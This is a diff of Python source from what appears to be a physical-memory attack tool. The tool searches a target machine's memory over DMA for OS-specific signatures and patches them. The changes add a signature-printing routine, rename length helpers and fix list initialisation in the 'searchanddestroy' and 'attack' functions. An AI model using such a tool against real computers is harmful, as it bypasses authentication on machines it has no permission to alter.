@@ -31,6 +31,42 @@ def select_target(targets, selected=False):
         msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit.')
         return select_target(targets)
 
+def printdetails(target):
+    '''
+    Prints details about a target
+    '''
+    msg('*', 'The attack contains the following signatures:')
+    versions = '\tVersions:\t'
+    for value in target['versions']:
+        versions += value
+        if not value is target['versions'][-1]: versions += ', '
+    print(versions)
+    print('\tArchitecture:\t' + target['architecture'])
+    for signature in target['signatures']:
+        offsets = '\n\t\tOffsets:\t'
+        for offset in signature['offsets']:
+            offsets += hex(offset)
+            if not offset is signature['offsets'][-1]: offsets += ', '
+        print(offsets)
+        sig = '\t\tSignature:\t0x'
+        ioffs = 0
+        patch = 0
+        poffs = 0
+        for chunk in signature['chunks']:
+            diff = chunk['internaloffset'] - bytelen(chunk['chunk']) - 1 - ioffs
+            for i in range(diff): # TODO: Find a more pythonic way of doing this
+                sig += '__'
+            ioffs = chunk['internaloffset']
+            sig += '{0:x}'.format(chunk['chunk'])
+            try:
+                patch = chunk['patch']
+                poffs = chunk['patchoffset']
+            except KeyError: pass
+        print(sig)
+        print('\t\tPatch:\t\t{0:#x}'.format(patch))
+        print('\t\tPatch offset:\t{0:#x}'.format(poffs))
+        
+    print()
 
 def initfw():
     '''
@@ -72,19 +108,24 @@ def findmemsize(d):
             return addr
     return None
 
-def getsiglength(l):
+def siglen(l):
     '''
-    Accepts integers and dicts with key 'internaloffset', and calculates
-    the length of the total signature in number of bytes in a tuple with a
-    boolean that indicates whether the signature is single or not
+    Accepts dicts with key 'internaloffset', and calculates the length of the 
+    total signature in number of bytes
     '''
     index = value = 0
     for i in range(len(l)):
         if l[i]['internaloffset'] > value:
             value = l[i]['internaloffset']
             index = i
-            
-    return (len(hex(l[index]['chunk'])) - 2) // 2 + value
+    # Must decrement bytelen with one since byte positions start at zero
+    return bytelen(l[index]['chunk']) - 1 + value
+
+def bytelen(s):
+    '''
+    Returns the byte length of an integer
+    '''
+    return (len(hex(s))) // 2
 
 def int2binhex(i):
     '''
@@ -137,7 +178,7 @@ def searchanddestroy(device, target, memsize):
     # Add signature lengths in bytes to the dictionary, and replace integer
     # representations of the signatures and patches with bytes
     for signature in signatures:
-        signature['length'] = getsiglength(signature['chunks'])
+        signature['length'] = siglen(signature['chunks'])
         offsets = signature['offsets'] # Offsets within pages
         for chunk in signature['chunks']:
             chunk['chunk'] = int2binhex(chunk['chunk'])
@@ -145,13 +186,15 @@ def searchanddestroy(device, target, memsize):
                 chunk['patch'] = int2binhex(chunk['patch'])
             except KeyError:
                 chunk['patch'] = None
-            
+
     try:
         # Build a batch of read requests of the form: [(addr1, len1), ...] and
         # a corresponding match vector: [(chunks1, patchoffset1), ...]
-        j = count = 0
+        j = 0
+        count = 0
         cand = b'\x00'
-        r = p = []
+        r = []
+        p = []
         while pageaddress < memsize:
             sig_len = len(signatures)
             
@@ -184,8 +227,10 @@ def searchanddestroy(device, target, memsize):
                         if sig_len == i and offset_len == n:
                             pageaddress = pageaddress + settings.PAGESIZE
                         # Zero out counters and vectors
-                        j = count = 0
-                        r = p = []
+                        j = 0
+                        count = 0
+                        r = []
+                        p = []
                         # Print status
                         mibaddr = pageaddress // settings.MiB
                         sys.stdout.write('[*] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
@@ -221,11 +266,13 @@ def attack(targets):
     # Print selection. If verbose, print selection with signatures
     msg('*', 'Selected target: ' + target['OS'] + ': ' + target['name'])
     if settings.verbose:
-        msg('*', 'The attack contains the following signatures:')
-        print()
+        #msg('*', 'The attack contains the following signatures:')
+        printdetails(target)
+        #print()
         # TODO: Create a pretty print method that can print this in a fashionable way
-        pprint(target['signatures'])
-        print()
+        #pprint(target['signatures'])
+        #print()
+        
         
     # Initialize and lower DMA shield
     device = None
